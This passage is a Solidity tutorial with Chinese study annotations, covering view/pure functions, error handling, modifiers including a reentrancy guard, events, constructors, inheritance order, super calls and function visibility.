<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">ViewAndPure</span> &#123;</span><br><span class="line">    uint public x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Promise not to modify the state.</span></span><br><span class="line">    <span class="comment">// 保证不改变状态变量，就是不改Storage的东西</span></span><br><span class="line">    <span class="comment">// 视图函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">addToX</span>(<span class="params">uint y</span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Promise not to modify or read from the state.</span></span><br><span class="line">    <span class="comment">// 读都不读，纯纯的函数了</span></span><br><span class="line">    <span class="comment">// 纯函数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">uint i, uint j</span>) public pure returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> i + j;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Error:</h1>
<p>An error will undo all changes made to the state during a transaction.<br />
You can throw an error by calling <code>require</code>, <code>revert</code> or <code>assert</code>.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>require</code> is used to validate inputs and conditions before execution. 在执行代码前，验证输入</p>
</li>
<li class="lvl-2">
<p><code>revert</code> is similar to <code>require</code>. See the code below for details.</p>
</li>
<li class="lvl-2">
<p><code>assert</code> is used to check for code that should never be false. Failing assertion probably means that there is a bug.<br />
Use custom error to save gas.</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Error</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testRequire</span>(<span class="params">uint _i</span>) public pure &#123;</span><br><span class="line">        <span class="comment">// Require should be used to validate conditions such as:</span></span><br><span class="line">        <span class="comment">// - inputs</span></span><br><span class="line">        <span class="comment">// - conditions before execution</span></span><br><span class="line">        <span class="comment">// - return values from calls to other functions</span></span><br><span class="line">        <span class="comment">// 三种情况：外部输入、执行前的一些判断条件、其它函数的返回值</span></span><br><span class="line">        <span class="built_in">require</span>(_i &gt; <span class="number">10</span>, <span class="string">&quot;Input must be greater than 10&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testRevert</span>(<span class="params">uint _i</span>) public pure &#123;</span><br><span class="line">        <span class="comment">// Revert is useful when the condition to check is complex.</span></span><br><span class="line">        <span class="comment">// This code does the exact same thing as the example above</span></span><br><span class="line">        <span class="comment">// 复杂的检验条件</span></span><br><span class="line">        <span class="comment">// 与上面的代码相同</span></span><br><span class="line">        <span class="keyword">if</span> (_i &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="title function_">revert</span>(<span class="string">&quot;Input must be greater than 10&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint public num;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testAssert</span>(<span class="params"></span>) public view &#123;</span><br><span class="line">        <span class="comment">// Assert should only be used to test for internal errors,</span></span><br><span class="line">        <span class="comment">// and to check invariants.</span></span><br><span class="line">        <span class="comment">// 仅用于内部错误检查 或 去检查一些不变量</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Here we assert that num is always equal to 0</span></span><br><span class="line">        <span class="comment">// since it is impossible to update the value of num</span></span><br><span class="line">        <span class="title function_">assert</span>(num == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// custom error</span></span><br><span class="line">    error <span class="title class_">InsufficientBalance</span>(uint balance, uint withdrawAmount);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testCustomError</span>(<span class="params">uint _withdrawAmount</span>) public view &#123;</span><br><span class="line">        uint bal = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">        <span class="keyword">if</span> (bal &lt; _withdrawAmount) &#123;</span><br><span class="line">            revert <span class="title class_">InsufficientBalance</span>(&#123;<span class="attr">balance</span>: bal, <span class="attr">withdrawAmount</span>: _withdrawAmount&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Here is another example</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Account</span> &#123;</span><br><span class="line">    uint public balance;</span><br><span class="line">    uint public constant <span class="variable constant_">MAX_UINT</span> = <span class="number">2</span>**<span class="number">256</span> - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">uint _amount</span>) public &#123;</span><br><span class="line">        uint oldBalance = balance;</span><br><span class="line">        uint newBalance = balance + _amount;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// balance + _amount does not overflow if balance + _amount &gt;= balance</span></span><br><span class="line">        <span class="built_in">require</span>(newBalance &gt;= oldBalance, <span class="string">&quot;Overflow&quot;</span>); <span class="comment">// 检查外部输入</span></span><br><span class="line"></span><br><span class="line">        balance = newBalance;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">assert</span>(balance &gt;= oldBalance); <span class="comment">// 检查内部错误</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint _amount</span>) public &#123;</span><br><span class="line">        uint oldBalance = balance;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// balance - _amount does not underflow if balance &gt;= _amount</span></span><br><span class="line">        <span class="built_in">require</span>(balance &gt;= _amount, <span class="string">&quot;Underflow&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (balance &lt; _amount) &#123;</span><br><span class="line">            <span class="title function_">revert</span>(<span class="string">&quot;Underflow&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        balance -= _amount;</span><br><span class="line"></span><br><span class="line">        <span class="title function_">assert</span>(balance &lt;= oldBalance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Function Modifier:</h1>
<p>Modifiers are code that can be run before and / or <strong>after a function call</strong>.🤔🤔🤔</p>
<p>Modifiers can be used to:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Restrict access</p>
</li>
<li class="lvl-2">
<p>Validate inputs</p>
</li>
<li class="lvl-2">
<p>Guard against reentrancy hack</p>
</li>
</ul>
<p>类似python的修饰器，其实本质是一个函数，可以定义任何功能的修饰器。一般修饰器的功能用于做 pre_check，相当于把<code>require</code>的代码块抽离出去了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">FunctionModifier</span> &#123;</span><br><span class="line">    <span class="comment">// We will use these variables to demonstrate how to use</span></span><br><span class="line">    <span class="comment">// modifiers.</span></span><br><span class="line">    address public owner;</span><br><span class="line">    uint public x = <span class="number">10</span>;</span><br><span class="line">    bool public locked;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">// Set the transaction sender as the owner of the contract.</span></span><br><span class="line">        owner = msg.<span class="property">sender</span>; <span class="comment">// 创建合约//发起一个创建合约的交易/创建人是 owner</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modifier to check that the caller is the owner of</span></span><br><span class="line">    <span class="comment">// the contract.</span></span><br><span class="line">    modifier <span class="title function_">onlyOwner</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner, <span class="string">&quot;Not owner&quot;</span>);</span><br><span class="line">        <span class="comment">// Underscore is a special character only used inside</span></span><br><span class="line">        <span class="comment">// a function modifier and it tells Solidity to</span></span><br><span class="line">        <span class="comment">// execute the rest of the code.</span></span><br><span class="line">        <span class="comment">// 下划线，类似预留位置😆</span></span><br><span class="line">        _; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modifiers can take inputs. This modifier checks that the</span></span><br><span class="line">    <span class="comment">// address passed in is not the zero address.</span></span><br><span class="line">    <span class="comment">// 检测入参地址 非0</span></span><br><span class="line">    modifier <span class="title function_">validAddress</span>(<span class="params">address _addr</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(_addr != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Not valid address&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">changeOwner</span>(<span class="params">address _newOwner</span>) public onlyOwner <span class="title function_">validAddress</span>(<span class="params">_newOwner</span>) &#123;</span><br><span class="line">        owner = _newOwner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Modifiers can be called before and / or after a function.</span></span><br><span class="line">    <span class="comment">// This modifier prevents a function from being called while</span></span><br><span class="line">    <span class="comment">// it is still executing.</span></span><br><span class="line">    <span class="comment">// 防重入修饰器：当函数在执行时不能被调用</span></span><br><span class="line">    modifier <span class="title function_">noReentrancy</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(!locked, <span class="string">&quot;No reentrancy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        locked = <span class="literal">true</span>;</span><br><span class="line">        _;</span><br><span class="line">        locked = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">decrement</span>(<span class="params">uint i</span>) public noReentrancy &#123;</span><br><span class="line">        x -= i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="title function_">decrement</span>(i - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Events:</h1>
<p><code>Events</code> allow logging to the Ethereum blockchain. Some use cases for events are:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Listening for events and updating user interface 可用作通知，前端可以监听并更新用户界面</p>
</li>
<li class="lvl-2">
<p>A cheap form of storage  非必要存储的，不记录在storage里，记录在event里</p>
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Event</span> &#123;</span><br><span class="line">    <span class="comment">// Event declaration</span></span><br><span class="line">    <span class="comment">// Up to 3 parameters can be indexed.  最多3个indexed参数</span></span><br><span class="line">    <span class="comment">// Indexed parameters helps you filter the logs by the indexed parameter 相当于标识符，索引，可以在日志里过滤出来</span></span><br><span class="line">    event <span class="title class_">Log</span>(address indexed sender, string message);</span><br><span class="line">    event <span class="title class_">AnotherLog</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">test</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(msg.<span class="property">sender</span>, <span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        emit <span class="title class_">Log</span>(msg.<span class="property">sender</span>, <span class="string">&quot;Hello EVM!&quot;</span>);</span><br><span class="line">        emit <span class="title class_">AnotherLog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Constructor:</h1>
<p>A constructor is an optional function that is executed upon contract creation. 合约创建时，构造函数是可选的<br />
Here are examples of how to pass arguments to constructors.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base contract X</span></span><br><span class="line">contract X &#123;</span><br><span class="line">    string public name;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _name</span>) &#123;</span><br><span class="line">        name = _name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Base contract Y</span></span><br><span class="line">contract Y &#123;</span><br><span class="line">    string public text;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _text</span>) &#123;</span><br><span class="line">        text = _text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// There are 2 ways to initialize parent contract with parameters.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Pass the parameters here in the inheritance list.</span></span><br><span class="line"><span class="comment">// 1.继承列表式</span></span><br><span class="line">contract B is <span class="title function_">X</span>(<span class="string">&quot;Input to X&quot;</span>), <span class="title function_">Y</span>(<span class="params"><span class="string">&quot;Input to Y&quot;</span></span>) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract C is X, Y &#123;</span><br><span class="line">    <span class="comment">// Pass the parameters here in the constructor,</span></span><br><span class="line">    <span class="comment">// similar to function modifiers.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2.类似函数修饰器的写法</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">string memory _name, string memory _text</span>) <span class="title function_">X</span>(_name) <span class="title function_">Y</span>(<span class="params">_text</span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Parent constructors are always called in the order of inheritance</span></span><br><span class="line"><span class="comment">// regardless of the order of parent contracts listed in the</span></span><br><span class="line"><span class="comment">// constructor of the child contract.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Order of constructors called:</span></span><br><span class="line"><span class="comment">// 1. X</span></span><br><span class="line"><span class="comment">// 2. Y</span></span><br><span class="line"><span class="comment">// 3. D</span></span><br><span class="line">contract D is X, Y &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title function_">X</span>(<span class="string">&quot;X was called&quot;</span>) <span class="title function_">Y</span>(<span class="params"><span class="string">&quot;Y was called&quot;</span></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Order of constructors called:</span></span><br><span class="line"><span class="comment">// 1. X</span></span><br><span class="line"><span class="comment">// 2. Y</span></span><br><span class="line"><span class="comment">// 3. E</span></span><br><span class="line">contract E is X, Y &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) <span class="title function_">Y</span>(<span class="string">&quot;Y was called&quot;</span>) <span class="title function_">X</span>(<span class="params"><span class="string">&quot;X was called&quot;</span></span>) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 始终按照继承顺序调用父构造函数</span></span><br></pre></td></tr></table></figure>
<h1>Inheritance：</h1>
<p>Solidity supports multiple inheritance. 支持多重继承<br />
Contracts can inherit other contract by using the <code>is</code> keyword.<br />
Function that is going to be overridden by a child contract must be declared as <code>virtual</code>. 父类声明虚函数，可被重写<br />
Function that is going to override a parent function must use the keyword <code>override</code>. 子类声明重载函数</p>
<p>Order of inheritance is important. 继承的顺序很重要<br />
You have to list the parent contracts in the order from “most base-like” to “most derived”.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Graph of inheritance</span></span><br><span class="line"><span class="comment">    A</span></span><br><span class="line"><span class="comment">   / \</span></span><br><span class="line"><span class="comment">  B   C</span></span><br><span class="line"><span class="comment"> / \ /</span></span><br><span class="line"><span class="comment">F  D,E</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public pure virtual returns (string memory) &#123; <span class="comment">// virtual</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;A&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Contracts inherit other contracts by using the keyword &#x27;is&#x27;.</span></span><br><span class="line">contract B is A &#123;</span><br><span class="line">    <span class="comment">// Override A.foo()</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public pure virtual override returns (string memory) &#123; <span class="comment">// virtual override</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;B&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract C is A &#123;</span><br><span class="line">    <span class="comment">// Override A.foo()</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public pure virtual override returns (string memory) &#123; <span class="comment">// virtual override</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Contracts can inherit from multiple parent contracts.</span></span><br><span class="line"><span class="comment">// When a function is called that is defined multiple times in</span></span><br><span class="line"><span class="comment">// different contracts, parent contracts are searched from</span></span><br><span class="line"><span class="comment">// right to left, and in depth-first manner.</span></span><br><span class="line"><span class="comment">// 当有同名函数时，深度优先，从右到左  😳😳😳</span></span><br><span class="line">contract D is B, C &#123;</span><br><span class="line">    <span class="comment">// D.foo() returns &quot;C&quot;</span></span><br><span class="line">    <span class="comment">// since C is the right most parent contract with function foo()</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public pure <span class="title function_">override</span>(B, C) returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">foo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract E is C, B &#123;</span><br><span class="line">    <span class="comment">// E.foo() returns &quot;B&quot;</span></span><br><span class="line">    <span class="comment">// since B is the right most parent contract with function foo()</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public pure <span class="title function_">override</span>(C, B) returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">foo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Graph of inheritance</span></span><br><span class="line"><span class="comment">    A</span></span><br><span class="line"><span class="comment">   / \</span></span><br><span class="line"><span class="comment">  B   C</span></span><br><span class="line"><span class="comment"> / \ /</span></span><br><span class="line"><span class="comment">F  D,E</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// Inheritance must be ordered from “most base-like” to “most derived”.</span></span><br><span class="line"><span class="comment">// Swapping the order of A and B will throw a compilation error.</span></span><br><span class="line"><span class="comment">// 编译报错 TypeError: Linearization of inheritance graph impossible</span></span><br><span class="line"><span class="comment">// 线性继承，声明顺序，类似： 钢笔is 物品,文具    大到小 总分结构</span></span><br><span class="line"><span class="comment">// 同名函数执行顺序，具体到抽象 文具foo()-&gt;物品foo()  小到大 分总结构</span></span><br><span class="line">contract F is A, B &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public pure <span class="title function_">override</span>(A, B) returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">super</span>.<span class="title function_">foo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Shadowing Inherited State Variables:</h1>
<p>Unlike functions, state variables cannot be overridden by re-declaring it in the child contract.<br />
与函数不同，状态变量不能通过在子合约中重新声明来重写。<br />
Let’s learn how to correctly override inherited state variables.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    string public name = <span class="string">&quot;Contract A&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getName</span>(<span class="params"></span>) public view returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Shadowing is disallowed in Solidity 0.6</span></span><br><span class="line"><span class="comment">// This will not compile</span></span><br><span class="line"><span class="comment">// contract B is A &#123;</span></span><br><span class="line"><span class="comment">//     string public name = &quot;Contract B&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">contract C is A &#123;</span><br><span class="line">    <span class="comment">// This is the correct way to override inherited state variables.</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">        name = <span class="string">&quot;Contract C&quot;</span>; <span class="comment">// <span class="doctag">TODO:</span> 只能在构造函数里声明吗？😨😨😨</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C.getName returns &quot;Contract C&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>Calling Parent Contracts:</h1>
<p>Parent contracts can be called directly, or by using the keyword <code>super</code>.<br />
使用<code>super</code>关键词直接调用父类方法<br />
By using the keyword <code>super</code>, all of the immediate parent contracts will be called.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Inheritance tree</span></span><br><span class="line"><span class="comment">   A</span></span><br><span class="line"><span class="comment"> /  \</span></span><br><span class="line"><span class="comment">B   C</span></span><br><span class="line"><span class="comment"> \ /</span></span><br><span class="line"><span class="comment">  D</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">contract A &#123;</span><br><span class="line">    <span class="comment">// This is called an event. You can emit events from your function</span></span><br><span class="line">    <span class="comment">// and they are logged into the transaction log. </span></span><br><span class="line">    <span class="comment">// In our case, this will be useful for tracing function calls.</span></span><br><span class="line">    <span class="comment">// 事件记录在交易收据里,便于跟踪</span></span><br><span class="line">    event <span class="title class_">Log</span>(string message);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public virtual &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="string">&quot;A.foo called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) public virtual &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="string">&quot;A.bar called&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract B is A &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public virtual override &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="string">&quot;B.foo called&quot;</span>);</span><br><span class="line">        A.<span class="title function_">foo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) public virtual override &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="string">&quot;B.bar called&quot;</span>);</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">bar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract C is A &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public virtual override &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="string">&quot;C.foo called&quot;</span>);</span><br><span class="line">        A.<span class="title function_">foo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) public virtual override &#123;</span><br><span class="line">        emit <span class="title class_">Log</span>(<span class="string">&quot;C.bar called&quot;</span>);</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">bar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract D is B, C &#123;</span><br><span class="line">    <span class="comment">// Try:</span></span><br><span class="line">    <span class="comment">// - Call D.foo and check the transaction logs.</span></span><br><span class="line">    <span class="comment">//   Although D inherits A, B and C, it only called C and then A.</span></span><br><span class="line">    <span class="comment">// - Call D.bar and check the transaction logs</span></span><br><span class="line">    <span class="comment">//   D called C, then B, and finally A.</span></span><br><span class="line">    <span class="comment">//   Although super was called twice (by B and C) it only called A once.</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) public <span class="title function_">override</span>(<span class="params">B, C</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">foo</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) public <span class="title function_">override</span>(<span class="params">B, C</span>) &#123;</span><br><span class="line">        <span class="variable language_">super</span>.<span class="title function_">bar</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用foo:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220713225842.png" alt="20220713225842" /></p>
<p>调用bar:<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220713225804.png" alt="20220713225804" /></p>
<h1>Visibility</h1>
<p>Functions and state variables have to declare whether they are accessible by other contracts.<br />
函数和状态变量必须声明它们是否可以被其他合约访问。</p>
<p>Functions can be declared as</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>public</code> - any contract and account can call 当前合约、子合约、外部合约和账户</p>
</li>
<li class="lvl-2">
<p><code>private</code> - only inside the contract that defines the function   当前合约</p>
</li>
<li class="lvl-2">
<p><code>internal</code> - only inside contract that inherits an internal function  当前合约和子合约</p>
</li>
<li class="lvl-2">
<p><code>external</code> - only other contracts and accounts can call  除了当前合约不能访问，子合约、外部合约和账户可以访问</p>
</li>
</ul>
<p>可见性，看不见、访问不到就没法子调用了。</p>
<p>public vs external ???</p>
<p>State variables can be declared as <code>public</code>, <code>private</code>, or <code>internal</code> but not <code>external</code>.</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.10</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Base</span> &#123;</span><br><span class="line">    <span class="comment">// Private function can only be called</span></span><br><span class="line">    <span class="comment">// - inside this contract</span></span><br><span class="line">    <span class="comment">// Contracts that inherit this contract cannot call this function.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">privateFunc</span>(<span class="params"></span>) private pure returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;private function called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testPrivateFunc</span>(<span class="params"></span>) public pure returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">privateFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Internal function can be called</span></span><br><span class="line">    <span class="comment">// - inside this contract</span></span><br><span class="line">    <span class="comment">// - inside contracts that inherit this contract</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">internalFunc</span>(<span class="params"></span>) internal pure returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;internal function called&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">testInternalFunc</span>(<span class="params"></span>) public pure virtual returns (string memory) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">internalFunc</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Public functions can be called</span></span><br><span class="line">    <span class="comment">// - inside this contract</span></span><br><span class="line">    <span class="comment">// - inside contracts that inherit this contract</span></span><br><span class="line">    <span class="comment">// - by other contracts and accounts</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">publicFunc</span>(<span class="params"></span>) public pure returns (string memory) 